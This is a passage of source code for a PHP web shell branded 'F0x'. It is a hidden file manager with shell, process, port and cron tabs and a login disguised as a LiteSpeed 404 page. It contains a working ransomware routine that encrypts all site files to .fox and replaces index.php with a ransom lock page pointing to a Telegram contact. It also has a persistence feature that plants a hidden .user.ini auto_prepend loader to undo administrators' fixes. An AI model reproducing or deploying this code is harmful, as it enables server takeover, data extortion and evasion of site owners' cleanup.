            $full = $dir.'/'.$file;
            if(is_dir($full)) encryptAll($full,$password,$keyFile,$cipher);
            else encryptFile($full,$password,$keyFile,$cipher);
        }
    }

    function createDecryptIndex($password){
        $decryptIndex = <<<PHP
<?php
\$passwordFile = 'fox.txt';
\$cipher = "aes-256-gcm";
function decryptFile(\$file,\$password){
    global \$cipher;
    \$data = base64_decode(file_get_contents(\$file));
    \$iv = substr(\$data,0,12);
    \$tag = substr(\$data,12,16);
    \$ciphertext = substr(\$data,28);
    \$plaintext = openssl_decrypt(\$ciphertext,\$cipher,hash('sha256',\$password,true),OPENSSL_RAW_DATA,\$iv,\$tag);
    \$orig = str_replace('.fox','',\$file);
    file_put_contents(\$orig,\$plaintext);
    unlink(\$file);
}
if(\$_SERVER['REQUEST_METHOD']==='POST'){
    \$pw = \$_POST['filepass'] ?? '';
    if(!file_exists(\$passwordFile)){ echo "Password not set"; exit; }
    if(hash('sha256',\$pw)!==file_get_contents(\$passwordFile)){ echo "Wrong password"; exit; }
    \$rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(__DIR__));
    foreach(\$rii as \$file){
        if(\$file->isDir()) continue;
        if(str_ends_with(\$file,'.fox')) decryptFile(\$file->getPathname(),\$pw);
    }
    echo "All decrypted!";
}
?>

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Security Lock Screen (Simulation)</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            mono: ['ui-monospace','SFMono-Regular','Menlo','Monaco','Consolas','Liberation Mono','Courier New','monospace']
          }
        }
      }
    }
  </script>
</head>

<body class="min-h-screen bg-black text-slate-100 font-mono">
  <main class="min-h-screen flex items-center justify-center px-4 py-10">
    <section class="w-full max-w-3xl text-center">
      <pre class="mx-auto inline-block text-[12px] sm:text-[13px] leading-[1.05] text-slate-100/90 select-none">
                                        
                                        
                \x8%%%Ut                
             .%%%* ...a%%%.             
            i%%?........?%%!            
           "%%............%%^           
           <%k............k%<           
           <%k............b%<           
        ''^8%k`````'`^^^`'h%{'''        
      J%%%&&WWWWWWW&WWWWWWWWWW&%%X      
     ]%o                        b%{     
     {%O                        Q%1     
     {%Q        '%BBBBB`        Q%{     
     {%Q        ,B&..8B:        Q%{     
     {%Q        `BB%%B%`        Q%{     
     {%Q          'BB`          Q%{     
     {%L           1\.          Q%{     
     {%Q                        Q%{     
      %%C                      L%%      
       t%%%%%%%%%%%%%%%%%%%%%%%8/       
      </pre>

      <div class="mt-2 text-sm tracking-wide text-slate-100">F0x Enc</div>

      <div class="mt-2 inline-flex items-center gap-2 text-xs tracking-wide">
        <span class="text-emerald-400">- [</span>
        <span class="text-emerald-400">No System Is Safe</span>
        <span class="text-emerald-400">]-</span>
      </div>

      <div class="mx-auto mt-4 w-full max-w-xl border-t border-dashed border-slate-500/50"></div>

      <p class="mt-3 text-xs text-slate-300">
        Need Key? <span class="text-slate-100 font-semibold">Click</span>
        <a href="http://t.me/f0x0x0x0x" class="text-violet-300 underline underline-offset-4">Here</a>
      </p>

      <form method="POST" class="mt-6 flex flex-wrap items-center justify-center gap-3">
        <input
          type="password"
          name="filepass"
          placeholder="Enter password"
          required
          class="w-80 max-w-[78vw] rounded-md border-2 border-dotted border-emerald-400/80 bg-transparent px-3 py-2 text-xs text-slate-100 placeholder:text-slate-500 outline-none"
        />

        <button
          type="submit"
          class="rounded-md border-2 border-dotted border-emerald-400/80 px-4 py-2 text-xs font-semibold text-slate-100 hover:bg-emerald-400/10 active:bg-emerald-400/15"
        >
          Decrypt All
        </button>
      </form>

      <div class="mt-5 text-xs text-slate-400">
        Status: <span class="text-red-300 font-semibold">LOCKED</span>
      </div>

      <div class="mt-3 text-[11px] text-slate-500">
        F0x
      </div>
    </section>
  </main>
</body>
</html>
PHP;
        file_put_contents('index.php', $decryptIndex);
    }

    // --- POST Handling ---
    if($_SERVER['REQUEST_METHOD']==='POST'){
        $password = $_POST['filepass'] ?? '';
        if(!$password) $message = "Enter password!";
        else {
            encryptAll($current,$password,$keyFile,$cipher);
            createDecryptIndex($password);
            $message = "All files encrypted! .fox created, index.php replaced with decrypt page.";
        }
    }

    $items = scandir($current);

    echo '<div class="p-4 max-w-5xl mx-auto flex flex-col gap-4">';
    if($message) echo '<div class="bg-yellow-700 text-black p-2 rounded font-bold text-center">'.$message.'</div>';
      echo '<form method="POST" class="flex gap-2 mb-4">';
    echo '<input type="password" name="filepass" placeholder="Enter password for encryption" class="flex-1 bg-gray-800 text-green-400 p-2 rounded" required>';
    echo '<button type="submit" class="bg-red-700 px-4 py-2 rounded hover:bg-red-900 transition">Encrypt All (.fox)</button>';
    echo '</form>';
    echo '<div class="grid grid-cols-1 md:grid-cols-2 gap-2">';
    foreach($items as $item){
        if($item==='.' || $item==='..') continue;
        $rel = str_replace($root.'/','',$current.'/'.$item);
        if(is_dir($current.'/'.$item)){
            echo '<div class="bg-purple-900 p-2 rounded hover:bg-purple-700 transition"><a href="?path='.urlencode($rel).'">'.$item.' 📁</a></div>';
        } else {
            echo '<div class="bg-gray-800 p-2 rounded hover:bg-green-900 transition">'.$item.' 📄</div>';
        }
    }
    echo '</div></div>';

  },


];

// Router
if (isset($_GET["script"])) {
  // Optional: kalau kamu pakai login, biar konsisten
  if (isset($ENABLE_LOGIN) && $ENABLE_LOGIN && empty($_SESSION["authed"])) {
    http_response_code(403);
    exit("Forbidden");
  }

  $key = (string)$_GET["script"];
  if (!isset($INLINE_SCRIPTS[$key]) || !is_callable($INLINE_SCRIPTS[$key])) {
    http_response_code(404);
    exit("Unknown script");
  }

  render_script_shell($key, $INLINE_SCRIPTS[$key]);
  exit;
}

function normalize_rel(string $rel): string {
  $rel = str_replace("\\", "/", $rel);
  $rel = ltrim($rel, "/");
  // collapse ../ and ./ safely by manual stack
  $parts = array_values(array_filter(explode("/", $rel), fn($p)=>$p!=="" && $p!=="."));
  $stack = [];
  foreach ($parts as $p) {
    if ($p === "..") { array_pop($stack); continue; }
    $stack[] = $p;
  }
  return implode("/", $stack);
}

function rel_to_abs(string $root, string $rel): string|false {
  $rel = normalize_rel($rel);
  // Ensure we join with a single slash
  $candidate = $root . "/" . $rel;
  $abs = realpath($candidate);
  if ($abs === false) return false;
  $abs = str_replace("\\", "/", $abs);
  // Case-insensitive check for Windows drive letters, with slash boundary to prevent suffix-prefix attacks
  $absCheck = rtrim($abs, "/") . "/";
  $rootCheck = rtrim($root, "/") . "/";
  if (stripos($absCheck, $rootCheck) !== 0) return false;
  return $abs;
}

function abs_to_rel(string $root, string $abs): string {
  $abs = str_replace("\\", "/", $abs);
  $root = str_replace("\\", "/", $root);
  // Case-insensitive replacement for Windows
  $absCheck = rtrim($abs, "/") . "/";
  $rootCheck = rtrim($root, "/") . "/";
  if (stripos($absCheck, $rootCheck) === 0) {
      $rel = ltrim(substr($abs, strlen(rtrim($root, "/"))), "/");
  } else {
      $rel = $abs;
  }
  return normalize_rel($rel);
}

function safe_join_under_root(string $root, string $dirRel, string $name): string|false {
  $dirRel = normalize_rel($dirRel);
  $name = str_replace(["\\","/"], "", $name);
  if ($name === "" || $name === "." || $name === "..") return false;

  $baseDir = $root . "/" . $dirRel;
  $baseAbs = realpath($baseDir);
  if ($baseAbs === false) return false;
  $absCheck = rtrim($baseAbs, "/") . "/";
  $rootCheck = rtrim($root, "/") . "/";
  if (stripos($absCheck, $rootCheck) !== 0) return false;

  $target = $baseAbs . "/" . $name;

  $parent = realpath(dirname($target));
  if ($parent === false) return false;
  $parentCheck = rtrim($parent, "/") . "/";
  if (stripos($parentCheck, $rootCheck) !== 0) return false;

  return $target;
}

function ext_lower(string $path): string {
  $e = pathinfo($path, PATHINFO_EXTENSION);
  return strtolower($e ?? "");
}

function fmt_bytes(int $b): string {
  $u = ["B","KB","MB","GB","TB"];
  $i = 0; $x = (float)$b;
  while ($x >= 1024 && $i < count($u)-1) { $x/=1024; $i++; }
  return ($i===0? (string)$b : number_format($x,2)) . " " . $u[$i];
}

function is_probably_binary(string $data): bool {
  if ($data === "") return false;
  if (strpos($data, "\0") !== false) return true;
  $len = strlen($data);
  $ctrl = 0;
  for ($i=0; $i<$len; $i++) {
    $c = ord($data[$i]);
    if ($c < 9 || ($c > 13 && $c < 32)) $ctrl++;
  }
  return ($ctrl / $len) > 0.12;
}

function can_edit_file(string $absPath, int $maxBytes, bool &$binary): bool {
  $binary = false;
  if (!is_file($absPath)) return false;
  $sz = filesize($absPath);
  if ($sz === false) return false;
  if ($sz > $maxBytes) return false;

  $buf = (string)file_get_contents($absPath);
  $binary = is_probably_binary($buf);
  return !$binary;
}

function audit(string $msg): void {
  if (!isset($_SESSION["audit"])) $_SESSION["audit"] = [];
  array_unshift($_SESSION["audit"], "[".date("Y-m-d H:i:s")."] ".$msg);
  $_SESSION["audit"] = array_slice($_SESSION["audit"], 0, 200);
}

function set_msg(string $text, string $type = "success"): void {
    $_SESSION["flash_msg"] = ["text" => $text, "type" => $type];
}

function ensure_dir(string $absDir): void {
  if (!is_dir($absDir)) @mkdir($absDir, 0755, true);
}

function list_dir(string $absDir, string $root): array {
  $items = @scandir($absDir);
  if (!is_array($items)) return [];
  $out = [];
  foreach ($items as $it) {
    if ($it === "." || $it === "..") continue;
    $full = $absDir . "/" . $it;
    $isDir = is_dir($full);
    $size = (!$isDir && is_file($full)) ? (@filesize($full) ?: 0) : 0;
    $mtime = @filemtime($full) ?: 0;
    $rel = abs_to_rel($root, $full);
    $out[] = [
      "name" => $it,
      "rel" => $rel,
      "is_dir" => $isDir,
      "size" => (int)$size,
      "mtime" => (int)$mtime,
      "ext" => $isDir ? "" : ext_lower($full),
      "mode" => @fileperms($full) ?: 0,
      "owner" => @fileowner($full),
      "group" => @filegroup($full),
      "w" => is_writable($full),
      "r" => is_readable($full),
      "mode_octal" => mode_octal(@fileperms($full) ?: 0),
    ];
  }
  usort($out, function($a,$b){
    if ($a["is_dir"] !== $b["is_dir"]) return $a["is_dir"] ? -1 : 1;
    return strcasecmp($a["name"], $b["name"]);
  });
  return $out;
}

function owner_name($uid): string {
  if ($uid === false || $uid === null) return "-";
  if (function_exists("posix_getpwuid")) {
    $pw = @posix_getpwuid((int)$uid);
    if (is_array($pw) && !empty($pw["name"])) return (string)$pw["name"];
  }
  return (string)$uid;
}
function group_name($gid): string {
  if ($gid === false || $gid === null) return "-";
  if (function_exists("posix_getgrgid")) {
    $gr = @posix_getgrgid((int)$gid);
    if (is_array($gr) && !empty($gr["name"])) return (string)$gr["name"];
  }
  return (string)$gid;
}
function mode_octal(int $perms): string {
  return substr(sprintf('%o', $perms), -4);
}

function scan_totals(string $root, int $cap): array {
  $files = 0; $dirs = 0; $bytes = 0; $entries = 0;
  try {
    $dirIt = new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS);
    $it = new RecursiveIteratorIterator($dirIt, RecursiveIteratorIterator::SELF_FIRST);
    foreach ($it as $f) {
      $entries++;
      if ($entries > $cap) break;
      if ($f->isDir()) $dirs++;
      else {
        $files++;
        $bytes += (int)($f->getSize() ?: 0);
      }
    }
  } catch (Exception $e) {
    // Silently continue if we hit permission errors
  } catch (Error $e) {
  }
  return ["files"=>$files, "dirs"=>$dirs, "bytes"=>$bytes, "capped"=>($entries > $cap)];
}

function tail_file(string $abs, int $lines = 200): string {
  if (!is_file($abs) || !is_readable($abs)) return "";
  $fp = @fopen($abs, "rb");
  if (!$fp) return "";
  $pos = -1;
  $line = "";
  $out = [];
  $chunk = "";
  fseek($fp, 0, SEEK_END);
  $size = ftell($fp);
  if ($size === 0) { fclose($fp); return ""; }

  while (count($out) < $lines && $size + $pos >= 0) {
    fseek($fp, $pos, SEEK_END);
    $c = fgetc($fp);
    if ($c === "\n") {
      $out[] = strrev($line);
      $line = "";
    } else {
      $line .= $c;
    }
    $pos--;
  }
  if ($line !== "") $out[] = strrev($line);
  fclose($fp);
  $out = array_reverse($out);
  return implode("\n", $out);
}

function backup_file(string $root, string $fileAbs, string $fileRel, string $backupDirAbs): string|false {
  if (!is_file($fileAbs)) {
      audit("BACKUP FAIL: source is not a file ($fileRel)");
      return false;
  }
  audit("BACKUP_START: $fileRel");
  ensure_dir($backupDirAbs);
  $stamp = date("Ymd-His");
  $safeRel = str_replace("/", "__", $fileRel);
  $dst = $backupDirAbs . "/" . $safeRel . ".bak." . $stamp;
  if (copy($fileAbs, $dst)) {
      audit("BACKUP OK: $fileRel -> ".basename($dst));
      return abs_to_rel($root, $dst);
  }
  audit("BACKUP FAIL: copy operation failed ($fileRel)");
  return false;
}

function trash_move(string $root, string $targetAbs, string $targetRel, string $trashAbs): string|false {
  if (!file_exists($targetAbs)) {
      audit("TRASH FAIL: source not found ($targetRel)");
      return false;
  }
  audit("TRASH_START: $targetRel");
  ensure_dir($trashAbs);
  $stamp = date("Ymd-His");
  $safeRel = str_replace("/", "__", $targetRel);
  $dst = $trashAbs . "/" . $safeRel . ".trash." . $stamp;
  if (rename($targetAbs, $dst)) {
      audit("TRASH OK: $targetRel -> ".basename($dst));
      return abs_to_rel($root, $dst);
  }
  audit("TRASH FAIL: rename operation failed ($targetRel)");
  return false;
}

function restore_trash(string $root, string $trashRel, string $trashDirAbs): bool {
  $trashAbs = rel_to_abs($root, $trashRel);
  if (!$trashAbs || !file_exists($trashAbs)) {
      audit("RESTORE FAIL: source not found ($trashRel)");
      return false;
  }

  $filename = basename($trashAbs);
  $pos = strrpos($filename, ".trash.");
  if ($pos === false) {
      audit("RESTORE FAIL: invalid trash format ($filename)");
      return false;
  }

  $safeRel = substr($filename, 0, $pos);
  $origRel = str_replace("__", "/", $safeRel);
  $origAbs = $root . "/" . $origRel;

  audit("RESTORE_START: $trashRel -> $origRel");
  ensure_dir(dirname($origAbs));
  
  $ok = rename($trashAbs, $origAbs);
  if ($ok) audit("RESTORE_SUCCESS: $origRel");
  else audit("RESTORE_FAILED: rename operation failed");
  
  return $ok;
}

function rcopy(string $src, string $dst): bool {
    if (is_dir($src)) {
        if (!is_dir($dst)) @mkdir($dst, 0755, true);
        $files = scandir($src);
        foreach ($files as $file) {
            if ($file !== "." && $file !== "..") {
                rcopy("$src/$file", "$dst/$file");
            }
        }
        return true;
    } elseif (is_file($src)) {
        return @copy($src, $dst);
    }
    return false;
}

/**
 * Recursive chmod
 */
function rchmod(string $abs, int $mode): bool {
    if (!file_exists($abs)) return false;
    if (is_dir($abs)) {
        $items = scandir($abs);
        foreach ($items as $item) {
            if ($item === "." || $item === "..") continue;
            rchmod($abs . "/" . $item, $mode);
        }
    }
    return @chmod($abs, $mode);
}

function rrmdir_empty_only(string $absDir): bool {
  if (!is_dir($absDir)) return false;
  $scan = scandir($absDir);
  if (!is_array($scan)) return false;
  return count($scan) <= 2 ? @rmdir($absDir) : false;
}

function zip_paths(string $root, array $rels, string $zipAbs, array &$err): bool {
  if (!class_exists("ZipArchive")) { $err[]="ZipArchive not available"; return false; }
  $zip = new ZipArchive();
  if ($zip->open($zipAbs, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
    $err[] = "Cannot create zip";
    return false;
  }
  foreach ($rels as $rel) {
    $abs = rel_to_abs($root, $rel);
    if (!$abs) continue;
    if (is_dir($abs)) {
      $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($abs, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
      );
      foreach ($it as $f) {
        $abs2 = $f->getPathname();
        $rel2 = abs_to_rel($root, $abs2);
        $local = $rel2; // keep root-relative inside zip
        if ($f->isDir()) {
          $zip->addEmptyDir($local);
        } else {
          $zip->addFile($abs2, $local);
        }
      }
    } else {
      $zip->addFile($abs, $rel);
    }
  }
  $zip->close();
  return true;
}

function extract_zip(string $zipAbs, string $destAbs, array &$err): bool {
  if (!class_exists("ZipArchive")) { $err[]="ZipArchive not available"; return false; }
  $zip = new ZipArchive();
  if ($zip->open($zipAbs) !== true) { $err[]="Cannot open zip"; return false; }
  if (!is_dir($destAbs)) { $err[]="Destination not found"; $zip->close(); return false; }
  // Note: Zip slip protection
  for ($i=0; $i<$zip->numFiles; $i++) {
    $name = $zip->getNameIndex($i);
    if ($name === false) continue;
    $name = str_replace("\\", "/", $name);
    if (str_contains($name, "../") || str_starts_with($name, "/")) {
      $err[]="Blocked suspicious entry: ".$name;
      $zip->close();
      return false;
    }
  }
  $ok = $zip->extractTo($destAbs);
  $zip->close();
  return (bool)$ok;
}

function xdiff_or_side_by_side(string $before, string $after): array {
  // returns [mode, output] where mode is "diff" or "side"
  if (function_exists("xdiff_string_diff")) {
    $d = @xdiff_string_diff($before, $after, 1);
    if (is_string($d)) return ["diff", $d];
  }
  return ["side", ""];
}

// ================== PHPINFO full page ==================
if (isset($_GET["phpinfo"])) { phpinfo(); exit; }

// ================== LOGIN ==================
if ($ENABLE_LOGIN) {

  if (isset($_POST["do_login"])) {
    csrf_check();

    $pw = (string)($_POST["password"] ?? "");
    $pwHash = hash('sha256', $pw);

    if (hash_equals($LOGIN_PASSWORD_HASH, $pwHash)) {
      $_SESSION["authed"] = true;
      audit("LOGIN OK");
      header("Location: " . $_SERVER["PHP_SELF"]);
      exit;
    } else {
      audit("LOGIN FAIL");
      $login_error = "Wrong password";
    }
  }

  if (isset($_POST["do_logout"])) {
    csrf_check();
    $_SESSION = [];
    session_destroy();
    session_start();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit;
  }

  if (empty($_SESSION["authed"])) {
    $csrf = csrf_token();
    ?>
<!doctype html>
<html lang="en" style="height:100%">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>404 Not Found</title>
  <style>
    @media (prefers-color-scheme:dark){body{background-color:#000!important}}
    .m{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.55)}
    .m>div{width:min(420px,calc(100vw - 32px));background:#0b0b0b;color:#e9e9e9;border:1px solid rgba(255,255,255,.12);border-radius:14px;box-shadow:0 18px 70px rgba(0,0,0,.18);padding:14px}
    .x{float:right;border:0;background:transparent;color:#cfcfcf;font-size:18px;cursor:pointer}
    .i{padding:10px 12px;border-radius:10px;border:1px solid rgba(255,255,255,.14);background:#0f0f0f;color:#e9e9e9;outline:none;font:normal 14px/20px Arial,Helvetica,sans-serif}
    .b{width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(255,255,255,.16);background:#1a1a1a;color:#f2f2f2;cursor:pointer;font:normal 14px/20px Arial,Helvetica,sans-serif}
    .e{margin:0 0 10px;color:#ffb4b4;font-size:13px;line-height:18px}
  </style>
</head>

<body style="color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff;">
  <div style="height:auto;min-height:100%;">
    <div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;">
      <h1 id="c404" style="margin:0;font-size:150px;line-height:150px;font-weight:bold;user-select:none;">404</h1>
      <h2 style="margin-top:20px;font-size:30px;">Not Found</h2>
      <p>The resource requested could not be found on this server!</p>
    </div>
  </div>

  <div style="color:#f0f0f0;font-size:12px;margin:auto;padding:0 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top:1px solid rgba(0,0,0,0.15);box-shadow:0 1px 0 rgba(255,255,255,0.3) inset;">
    <br>Proudly powered by LiteSpeed Web Server
    <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
  </div>

  <div id="m" class="m" aria-hidden="true">
    <div role="dialog" aria-modal="true">
      <button type="button" class="x" id="mx" aria-label="Close">✕</button>
      <div style="font-weight:bold;margin-bottom:10px;">Access</div>

      <?php if (!empty($login_error)): ?>
        <p class="e"><?= h($login_error) ?></p>
      <?php endif; ?>

      <form method="post" style="display:grid;gap:10px;">
        <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
        <input type="password" name="password" placeholder="Password" class="i" required>
        <button type="submit" name="do_login" value="1" class="b">ENTER</button>
      </form>
    </div>
  </div>

  <script>
    (function(){
      var c=document.getElementById('c404'), m=document.getElementById('m'), x=document.getElementById('mx');
      var n=0,t=0;
      function openM(){m.style.display='flex';m.setAttribute('aria-hidden','false');var p=m.querySelector('input[type=password]'); if(p)p.focus();}
      function closeM(){m.style.display='none';m.setAttribute('aria-hidden','true');}
      c.onclick=function(){
        n++; clearTimeout(t); t=setTimeout(function(){n=0;},1200);
        if(n>=5){n=0; openM();}
      };
      x.onclick=closeM;
      m.onclick=function(e){ if(e.target===m) closeM(); };
      document.onkeydown=function(e){ if(e.key==='Escape' && m.style.display==='flex') closeM(); };
      <?php if (!empty($login_error)): ?>openM();<?php endif; ?>
    })();
  </script>
</body>
</html>
    <?php
    exit;
  }
}
// ================== CURRENT PATH & TAB ==================
$defaultPath = abs_to_rel($ROOT, $SCRIPT_DIR);
$pathRel = normalize_rel((string)($_GET["path"] ?? $defaultPath));
$absCurrent = ($pathRel === "") ? $ROOT : rel_to_abs($ROOT, $pathRel);
if ($absCurrent === false || !is_dir($absCurrent)) { 
    $absCurrent = $SCRIPT_DIR; 
    $pathRel = $defaultPath; 
}

$tab = (string)($_GET["tab"] ?? "files"); // files | search | tail | trash | backups | diag | process | ports | cron | fim
$tab = in_array($tab, ["files","search","tail","trash","backups","diag","process","ports","cron","fim","shell"], true) ? $tab : "files";

$TRASH_ABS  = $SCRIPT_DIR . "/" . $TRASH_DIRNAME;
$BACKUP_ABS = $SCRIPT_DIR . "/" . $BACKUP_DIRNAME;
$TMP_ABS    = $SCRIPT_DIR . "/" . $TMP_DIRNAME;

// Ensure internal dirs exist (but keep hidden)
ensure_dir($TRASH_ABS);
ensure_dir($BACKUP_ABS);
ensure_dir($TMP_ABS);

// ================== ACTIONS ==================
$flash = "";
$flashType = "ok";
$csrf = csrf_token();

function redirect_here(string $pathRel, string $tab, array $extra = []): void {
  $qs = ["path"=>$pathRel, "tab"=>$tab] + $extra;
  $q = http_build_query($qs);
  $url = $_SERVER["PHP_SELF"]."?".$q;
  
  if (!empty($_SERVER['HTTP_HX_REQUEST'])) {
    header("HX-Redirect: " . $url);
  } else {
    header("Location: " . $url);
  }
  exit;
}

function get_fim_temp_dir(): string {
  global $ROOT;
  return rtrim(sys_get_temp_dir(), "/\\") . '/.fox_fim_' . md5($ROOT);
}

function is_guard_active(): bool {
  global $ROOT;
  $guardPath = get_fim_temp_dir() . '/fox_integrity_guard.php'; // Persistent indicator
  
  $parentDir = dirname($ROOT);
  $iniInParent = file_exists($parentDir . '/.user.ini');
  $iniInRoot = file_exists($ROOT . '/.user.ini');
  
  return file_exists($guardPath) && ($iniInParent || $iniInRoot);
}

function is_session_locked(): bool {
  global $ROOT;
  return is_guard_active() || !empty($_SESSION["lock_session"]) || file_exists($ROOT . '/fox_integrity_guard.php');
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
  csrf_check();
  $action = (string)($_POST["action"] ?? "");

  // Intercept all modifying actions if session is locked
  $allowedActions = ["unlock_session", "guard_unlock", "do_login", "do_logout", "set_theme", "export_audit"];
  if (is_session_locked() && !in_array($action, $allowedActions, true)) {
    audit("GLOBAL_LOCK BLOCKED: Attempted action '$action'");
    set_msg("Action denied: GLOBAL INTEGRITY LOCK is Active (Auto-Rollback enabled)", "error");
    redirect_here($pathRel, $tab);
  }
    // ---------- Set Theme ----------
  if ($action === "set_theme") {
    global $THEMES;
    $t = (string)($_POST["theme"] ?? "");
    if (isset($THEMES[$t])) {
      $_SESSION["theme"] = $t;
      audit("THEME: ".$t);
    } else {
      audit("THEME FAIL: ".$t);
    }
    redirect_here($pathRel, $tab);
  }

  // ---------- Lock Session (Global Integrity) ----------
  if ($action === "lock_session") {
    $fimDir = $ROOT . '/.FIM_backups';
    if (!is_dir($fimDir)) @mkdir($fimDir, 0755, true);
    
    // Hide and protect backup dir on Windows
    if ($IS_WINDOWS) @shell_exec("attrib +h +s +r " . escapeshellarg($fimDir));

    $manifest = [];
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($ROOT, RecursiveDirectoryIterator::SKIP_DOTS));
    
    foreach ($it as $file) {
        $path = $file->getRealPath();
        $rel = abs_to_rel($ROOT, $path);
        
        // Exclude system/trash/backup folders
        if (str_starts_with($rel, '.FTemp') || str_starts_with($rel, '.Ftrash') || 
            str_starts_with($rel, '.FBacks') || str_starts_with($rel, '.FIM_backups')) continue;
        
        if ($file->isFile()) {
            $manifest[$rel] = [
                'size' => $file->getSize(),
                'mtime' => $file->getMTime(),
                'hash' => hash_file('sha256', $path)
            ];
            
            // Backup the file
            $dest = $fimDir . '/' . $rel;
            $destDir = dirname($dest);
            if (!is_dir($destDir)) @mkdir($destDir, 0755, true);
            @copy($path, $dest);
        }
    }
    
    @file_put_contents($fimDir . '/manifest.json', json_encode($manifest));
    
    // Create the Guard Loader
    $guardPath = $ROOT . '/fox_integrity_guard.php';
    $guardContent = "<?php
/* Fox Integrity Guard - Automatic Rollback */
\$root = '" . str_replace("\\", "/", $ROOT) . "';
\$fim = \$root . '/.FIM_backups';
\$manPath = \$fim . '/manifest.json';

if (file_exists(\$manPath)) {
    \$manifest = json_decode(file_get_contents(\$manPath), true);
    foreach (\$manifest as \$rel => \$meta) {
        \$abs = \$root . '/' . \$rel;
        \$bkp = \$fim . '/' . \$rel;
        \$restore = false;

        if (!file_exists(\$abs)) {
            \$restore = true;
        } else if (filesize(\$abs) !== \$meta['size'] || filemtime(\$abs) !== \$meta['mtime']) {
            if (hash_file('sha256', \$abs) !== \$meta['hash']) {
                \$restore = true;
            }
        }

        if (\$restore && file_exists(\$bkp)) {
            \$dir = dirname(\$abs);
            if (!is_dir(\$dir)) @mkdir(\$dir, 0755, true);
            if (@copy(\$bkp, \$abs)) {
                \$logFile = \$root . '/audit.log';
                \$time = date('Y-m-d H:i:s');
                @file_put_contents(\$logFile, \"[\$time] FIM_RESTORE: \$rel\n\", FILE_APPEND);
            }
        }
    }
}
";
    @file_put_contents($guardPath, $guardContent);
    
    // Deploy .user.ini
    @file_put_contents($ROOT . '/.user.ini', "auto_prepend_file=\"" . str_replace("\\", "/", $guardPath) . "\"");
    if ($IS_WINDOWS) @shell_exec("attrib +h +s +r " . escapeshellarg($ROOT . '/.user.ini'));

    $_SESSION["lock_session"] = true;
    audit("GLOBAL LOCK: Activated with Auto-Rollback");
    set_msg("Global Integrity Lock Activated: All modifications will be automatically rolled back.");
    redirect_here($pathRel, $tab);
  }

  // ---------- Unlock Session ----------
  if ($action === "unlock_session") {
    $pw = (string)($_POST["password"] ?? "");
    $pwHash = hash('sha256', $pw);
    if (!hash_equals($LOGIN_PASSWORD_HASH, $pwHash)) {
        audit("GLOBAL UNLOCK FAIL: Wrong password");
        set_msg("Unlock failed: Wrong password", "error");
    } else {
        // Cleanup FIM
        $fimDir = $ROOT . '/.FIM_backups';
        if ($IS_WINDOWS) @shell_exec("attrib -h -s -r " . escapeshellarg($ROOT . '/.user.ini'));
        @unlink($ROOT . '/.user.ini');
        @unlink($ROOT . '/fox_integrity_guard.php');
        
        // Recursive delete FIM backups
        if (is_dir($fimDir)) {
            if ($IS_WINDOWS) @shell_exec("attrib -h -s -r " . escapeshellarg($fimDir));
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fimDir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($it as $file) {
                if ($file->isDir()) rmdir($file->getRealPath());
                else unlink($file->getRealPath());
            }
            rmdir($fimDir);
        }

        unset($_SESSION["lock_session"]);
        audit("GLOBAL UNLOCK: Deactivated");
        set_msg("Global Lock Deactivated");
    }
    redirect_here($pathRel, $tab);
  }

  $sel = $_POST["sel"] ?? [];
  if (!is_array($sel)) $sel = [];

  // Helper for selected
  $selectedRels = array_values(array_unique(array_filter(array_map(fn($x)=>normalize_rel((string)$x), $sel), fn($x)=>$x!=="" )));

  // ---------- Mkdir ----------
  if ($action === "mkdir") {
    $name = (string)($_POST["name"] ?? "");
    if ($name === "") {
        audit("MKDIR FAIL: name required");
        set_msg("Name required", "error");
    } else {
        $dest = safe_join_under_root($ROOT, $pathRel, $name);
        if ($dest) {
          if (@mkdir($dest, 0755, true)) {
            audit("MKDIR OK: ".abs_to_rel($ROOT, $dest));
            set_msg("Directory created");
          } else {
            audit("MKDIR FAIL: could not create directory ($name)");
            set_msg("Failed to create directory", "error");
          }
        } else {
          audit("MKDIR FAIL: invalid path ($name)");
          set_msg("Invalid path", "error");
        }
    }
    redirect_here($pathRel, "files");
  }

  // ---------- Touch ----------
  if ($action === "touch") {
    $name = (string)($_POST["name"] ?? "");
    $content = (string)($_POST["content"] ?? "");
    if ($name === "") {
        audit("TOUCH FAIL: name required");
        set_msg("Name required", "error");
    } else {
        $dest = safe_join_under_root($ROOT, $pathRel, $name);
        if ($dest) {
          if (@file_put_contents($dest, $content) !== false) {
            audit("TOUCH OK: ".abs_to_rel($ROOT, $dest));
            set_msg("File created");
          } else {
            audit("TOUCH FAIL: could not write file ($name)");
            set_msg("Failed to create file", "error");
          }
        } else {
          audit("TOUCH FAIL: invalid path ($name)");
          set_msg("Invalid path", "error");
        }
    }
    redirect_here($pathRel, "files");
  }

  // ---------- Upload ----------
  if ($action === "upload") {
    audit("UPLOAD_REQUEST: starting upload process");
    if (!isset($_FILES["up"])) {
      audit("UPLOAD FAIL: no files found");
    } else {
      $files = $_FILES["up"];
      // Handle both single and multiple file uploads (normalize to array)
      if (!is_array($files["name"])) {
        $files = [
          "name" => [$files["name"]],
          "tmp_name" => [$files["tmp_name"]],
          "size" => [$files["size"]],
          "error" => [$files["error"]],
        ];
      }

      $successCount = 0;
